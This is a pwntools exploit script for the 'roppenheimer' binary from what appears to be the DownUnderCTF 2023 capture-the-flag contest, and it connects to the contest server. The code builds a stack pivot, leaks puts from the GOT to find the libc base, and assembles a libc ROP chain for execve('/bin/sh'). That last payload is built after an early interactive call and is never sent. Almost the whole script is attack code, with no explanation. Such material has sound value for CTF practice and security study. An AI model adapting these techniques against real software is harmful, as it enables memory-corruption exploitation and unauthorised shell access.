#!/usr/bin/env python3

from pwn import *

exe = ELF("roppenheimer")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("2023.ductf.dev", 30012)

    return r

r = conn()

sla = lambda a,b : r.sendlineafter(a,b)
sl = lambda a : r.sendline(a)
ru = lambda a : r.recvline(a)
to_bytes = lambda a : f'{a}'.encode('utf-8')

pivot = 0x00000000004025de#: pop rax; pop rsp; pop rdi; nop; pop rbp; ret;
nop = 0x000000000040201a#: ret;
pop_rdi = 0x00000000004025e0#: pop rdi; nop; pop rbp; ret;
pop_rsi = 0x0000000000404944#: pop rsi; pop rbp; ret;
username = 0x40a520
puts_plt = 0x402484
puts_got = 0x40a110
restart = 0x402d0b
stdin = 0x0040a190
pppr = 0x000000000040404d#: pop r12; pop r13; pop rbp; ret
loads = 0x000000000040453a#: mov rax, qword ptr [rax]; pop rbp; ret;
weird = 0x00000000004056dc#: mov rdx, qword ptr [rdx]; mov qword ptr [rax], rdx; nop; pop rbp; ret;
weirder = 0x00000000004043d8#: mov rdx, qword ptr [rbp - 0x10]; mov qword ptr [rax], rdx; nop; pop rbp; ret;
super_weird = 0x00000000004056d8#: mov rdx, qword ptr [rbp - 0x10]; mov rdx, qword ptr [rdx]; mov qword ptr [rax], rdx; nop; pop rbp; ret;
pivot2 = 0x0000000000404ac7#: pop rsp; pop rbp; ret;

useful = 0x00000000004025de#pop rax; pop rsp; pop rdi; nop; pop rbp; ret;

def add_atom(index, data):
    sla(b'choice> ', to_bytes(1))
    log.info(f'sending atom {hex(index)}')
    sla(b'atom> ', to_bytes(index))
    sla(b'data> ', to_bytes(data))

def fire_nuetron(index, payload):
    sla(b'choice> ', b'2')
    sla(b'atom> ', b'1'+payload)

def pwn(payload):
    ru(b'name> ')
    log.info(f"length of payload {hex(len(payload))}")
    r.sendline(payload)

    for i in range(1,28):
        add_atom(1+((i-1)*0xFE7), i)
    add_atom(1+((27)*0xFE7), pivot)
    add_atom(1+((28)*0xFE7), username)
    add_atom(1+((29)*0xFE7), 29)
    add_atom(1+((30)*0xFE7), 30)
    add_atom(1+((31)*0xFE7), 31)

    payload2 = p64(pop_rdi)
    payload2 += p64(puts_got)
    payload2 += p64(0)
    payload2 += p64(puts_plt)
    payload2 += p64(useful)
    payload2 += p64(username+0x100)
    payload2 += p64(username+0x88)
    payload2 += p64(username+0x200)
    payload2 += p64(username+0x110)
    payload2 += p64(super_weird)
    payload2 += p64(0)
    payload2 += p64(exe.plt["fgets"])
    payload2 += p64(pivot)
    payload2 += p64(0)
    payload2 += p64(username+0x200)
    payload2 += p64(0)
    payload2 += p64(stdin) * 0x20

    fire_nuetron(1, payload2)


def main():
    payload = p64(stdin)*2
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(0)
    payload += p64(puts_plt)
    payload += p64(useful)
    payload += p64(username+0x100)
    payload += p64(username+0x48)
    payload += p64(username+0x70)
    payload += p64(username+0x10)
    payload += p64(super_weird)
    payload += p64(0)
    payload += p64(exe.plt["fgets"])

    pwn(payload)

    for i in range(26):
        r.recvline()

    leak = u64(r.recv(6)+b'\x00\x00')
    log.info(f"leaked address: {hex(leak)}")
    libc.address = leak - libc.symbols["puts"]
    log.info(f"libc address: {hex(libc.address)}")

    r.interactive()

    pop_rdi_libc = 0x000000000002a3e5#: pop rdi; ret;
    pop_rsi = 0x000000000002be51#: pop rsi; ret;
    pop_rdx = 0x000000000011f497#: pop rdx; pop r12; ret;
    pop_rax = 0x0000000000045eb0#: pop rax; ret;
    syscall = 0x0000000000091396#: syscall; ret;

    payload = p64(pop_rdi_libc+libc.address)
    payload += p64(username+0x250)
    payload += p64(pop_rsi + libc.address)
    payload += p64(0)
    payload += p64(pop_rdx + libc.address)
    payload += p64(0)
    payload += p64(0)
    payload += p64(pop_rax + libc.address)
    payload += p64(0x3b)
    payload += p64(syscall + libc.address)
    payload += b'/bin/sh\x00'

    r.interactive()

if __name__ == "__main__":
    main()
